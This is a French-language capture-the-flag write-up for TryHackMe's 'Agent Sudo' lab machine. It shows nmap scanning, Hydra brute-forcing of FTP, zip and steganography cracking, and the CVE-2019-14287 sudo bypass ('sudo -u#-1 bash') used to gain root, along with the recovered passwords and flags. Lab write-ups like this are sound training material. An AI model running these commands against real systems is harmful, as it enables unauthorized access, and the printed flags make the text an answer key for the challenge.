# Agent Sudo #

## Task 1  Author note ##
**Deploy the machine**

Sur le site cliquez sur Start Machine, puis liez votre machine avec leur VPN.  

## Task 2 Enumerate ##
```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo sh -c "echo '10.10.134.69 agent-sudo.thm' >> /etc/hosts"
tim@kali:~/Bureau/tryhackme/write-up$ sudo nmap -A agent-sudo.thm
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-19 08:40 CEST
Nmap scan report for agent-sudo.thm (10.10.134.69)
Host is up (0.034s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=7/19%OT=21%CT=1%CU=37647%PV=Y%DS=2%DC=T%G=Y%TM=60F51E8
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=I%TS=A)SEQ(SP=1
OS:07%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=A)OPS(O1=M506ST11NW6%O2=M506ST11NW6%O
OS:3=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST11NW6%O6=M506ST11)WIN(W1=68DF%W2=
OS:68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M506NNSN
OS:W6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   33.89 ms 10.9.0.1
2   33.62 ms agent-sudo.thm (10.10.134.69)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.21 seconds
```

**How many open ports?**
Les résultats de nmap nous montre 3 ports ouverts.  
-Service ftp port 21   
-Service ssh port 22  
-service http port 80 

Réponse : 3  

**How you redirect yourself to a secret page?**
```bash
curl -A "R" -L http://agent-sudo.thm
What are you doing! Are you one of the 25 employees? If not, I going to report this incident
<!DocType html>
<html>
<head>
	<title>Annoucement</title>
</head>

<body>
<p>
	Dear agents,
	<br><br>
	Use your own <b>codename</b> as user-agent to access the site.
	<br><br>
	From,<br>
	Agent R
</p>
</body>
</html>
```
On modifie l'user agent pour voire la page secrete.  

**What is the agent name?**
```bash
tim@kali:~/Bureau/tryhackme/write-up$ for lettre in {A..Z};do echo "${lettre}";curl -A "${lettre}" -L http://agent-sudo.thm ;done 
A

<!DocType html>
<html>
<head>
	<title>Annoucement</title>
</head>

<body>
<p>
	Dear agents,
	<br><br>
	Use your own <b>codename</b> as user-agent to access the site.
	<br><br>
	From,<br>
	Agent R
</p>
</body>
</html>
B

<!DocType html>
<html>
<head>
	<title>Annoucement</title>
</head>

<body>
<p>
	Dear agents,
	<br><br>
	Use your own <b>codename</b> as user-agent to access the site.
	<br><br>
	From,<br>
	Agent R
</p>
</body>
</html>
C
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R 
```

D'après le message ci-dessus il y a un agent qui rapporté un accident d'après ce que l'on comprend les noms des agents sont les lettres de l'alphabet.  
On code un scrip qui énumère toutes les solutions.  
A la lettre C on a le non de l'agent qui est chris.  

Réponse : chris 

## Task 3 Hash cracking and brute-force ##

**FTP password**
```bash
tim@kali:~/Bureau/tryhackme/write-up$ hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://agent-sudo.thm -t 12
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-19 09:47:54
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 12 tasks per 1 server, overall 12 tasks, 14344399 login tries (l:1/p:14344399), ~1195367 tries per task
[DATA] attacking ftp://agent-sudo.thm:21/
[STATUS] 199.00 tries/min, 199 tries in 00:01h, 14344200 to do in 1201:22h, 12 active
[21][ftp] host: agent-sudo.thm   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-19 09:49:23
```

On crack le mot de passe avec Hydra.  
On trouve le mot passe.  

Réponse : crystal  

**Zip file password**
```bash
tim@kali:~/Bureau/tryhackme/write-up$ ftp agent-sudo.thm
Connected to agent-sudo.thm.
220 (vsFTPd 3.0.3)
Name (agent-sudo.thm:tim): chris
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> get To_agentJ.txt
local: To_agentJ.txt remote: To_agentJ.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
226 Transfer complete.
217 bytes received in 0.00 secs (152.5659 kB/s)
ftp> get cute-alien.jpg
local: cute-alien.jpg remote: cute-alien.jpg
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
226 Transfer complete.
33143 bytes received in 0.04 secs (900.8882 kB/s)
ftp> get cutie.png
local: cutie.png remote: cutie.png
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for cutie.png (34842 bytes).
226 Transfer complete.
34842 bytes received in 0.04 secs (924.9548 kB/s)
ftp> exit
221 Goodbye.
```

On récupère les fichiers.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ cat To_agentJ.txt 
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

On regarde le message on dit que les images sont fausses et que les identifiants sont dans les images.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ binwalk cutie.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22

```

On remarque qu'il y des fichiers cachés dans l'image.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ binwalk -e cutie.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
im@kali:~/Bureau/tryhackme/write-up$ cd _cutie.png.extracted/
tim@kali:~/Bureau/tryhackme/write-up/_cutie.png.extracted$ ls
365  365.zlib  8702.zip  To_agentR.txt
```

Il y a un fichier 8702.zip 

```tim@kali:~/Bureau/tryhackme/write-up/_cutie.png.extracted$ john hash -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (8702.zip/To_agentR.txt)
1g 0:00:00:00 DONE (2021-07-19 10:01) 4.545g/s 111709p/s 111709c/s 111709C/s christal..280789
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

On crack le fichier avec john the ripper.  

La réponse est : alien 

**steg password**
```bash
tim@kali:~/Bureau/tryhackme/write-up$ stegseek cute-alien.jpg /usr/share/wordlists/rockyou.txt 
StegSeek version 0.5
Progress: 12.64% (17685704 bytes)           

[i] --> Found passphrase: "Area51"
[i] Original filename: "message.txt"
[i] Extracting to "cute-alien.jpg.out"
```

Brute force le chiffrement sur l'image.  
On trouve le mot de passe.  

Réponse : Area51  

**Who is the other agent (in full name)?** 
```bash
tim@kali:~/Bureau/tryhackme/write-up$ cat cute-alien.jpg.out 
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
``` 

On voit ici que le nom est : james.  
Réponse : james

**SSH password** 
Dans le message on a le mot de passe : hackerrules!

Réponse : hackerrules! 

## Task 4 Capture the user flag ##

**What is the user flag?**
```bash
tim@kali:~/Bureau/tryhackme/write-up$ ssh james@agent-sudo.thm
The authenticity of host 'agent-sudo.thm (10.10.190.152)' can't be established.
ECDSA key fingerprint is SHA256:yr7mJyy+j1G257OVtst3Zkl+zFQw8ZIBRmfLi7fX/D8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'agent-sudo.thm,10.10.190.152' (ECDSA) to the list of known hosts.
james@agent-sudo.thm's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jul 19 15:19:02 UTC 2021

  System load:  0.0               Processes:           93
  Usage of /:   39.7% of 9.78GB   Users logged in:     0
  Memory usage: 31%               IP address for eth0: 10.10.190.152
  Swap usage:   0%


75 packages can be updated.
33 updates are security updates.


Last login: Tue Oct 29 14:26:27 2019
james@agent-sudo:~$ whoami
james
james@agent-sudo:~$ ls
Alien_autospy.jpg  user_flag.txt
james@agent-sudo:~$ cat user_flag.txt 
b03d975e8c92a7c04146cfa7a5a313c7
```

On se connect avec les identifiants et on récupère le flag.  
Réponse : b03d975e8c92a7c04146cfa7a5a313c7 

**What is the incident of the photo called?**
```bash
tim@kali:~/Bureau/tryhackme/write-up$ scp james@agent-sudo.thm:./Alien_autospy.jpg ./
james@agent-sudo.thm's password: 
Alien_autospy.jpg              
```
On télécharge Alien_autospy sur notre machine.  
Puis on fait une recherche inversée avec [google images](https://images.google.com/).  

La réponse est : Roswell alien autopsy  

## Task 5 Privilege escalation ##
**CVE number for the escalation**

```bash
james@agent-sudo:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
james@agent-sudo:~$ sudo -V
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
tim@kali:~/Bureau/tryhackme/write-up$ searchsploit sudo 1.8
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
sudo 1.8.0 < 1.8.3p1 - 'sudo_debug' glibc FORTIFY_SOURCE Bypass + Privilege Escalation                                                                                                                      | linux/local/25134.c
sudo 1.8.0 < 1.8.3p1 - Format String                                                                                                                                                                        | linux/dos/18436.txt
Sudo 1.8.14 (RHEL 5/6/7 / Ubuntu) - 'Sudoedit' Unauthorized Privilege Escalation                                                                                                                            | linux/local/37710.txt
Sudo 1.8.20 - 'get_process_ttyname()' Local Privilege Escalation                                                                                                                                            | linux/local/42183.c
Sudo 1.8.25p - 'pwfeedback' Buffer Overflow                                                                                                                                                                 | linux/local/48052.sh
Sudo 1.8.25p - 'pwfeedback' Buffer Overflow (PoC)                                                                                                                                                           | linux/dos/47995.txt
sudo 1.8.27 - Security Bypass                                                                                                                                                                               | linux/local/47502.py
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------

tim@kali:~/Bureau/tryhackme/write-up$ cat /usr/share/exploitdb/exploits/linux/local/47502.py | head | grep CVE
# CVE : 2019-14287
```

En faisant un recherche sur sudo on arrive trouver le CVE de l'exploit.  
La réponse est : CVE-2019-14287  

**What is the root flag?**
```bash
james@agent-sudo:~$ sudo -u#-1 bash
root@agent-sudo:~# cat /root/root.txt
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
```

On exploite la faille de sécurité.  
La réponse est : b53a02f55b57d4439e3341834d70c062  

**(Bonus) Who is Agent R?**
On à la réponse à la fin du message.  

Réponse : Deskel  
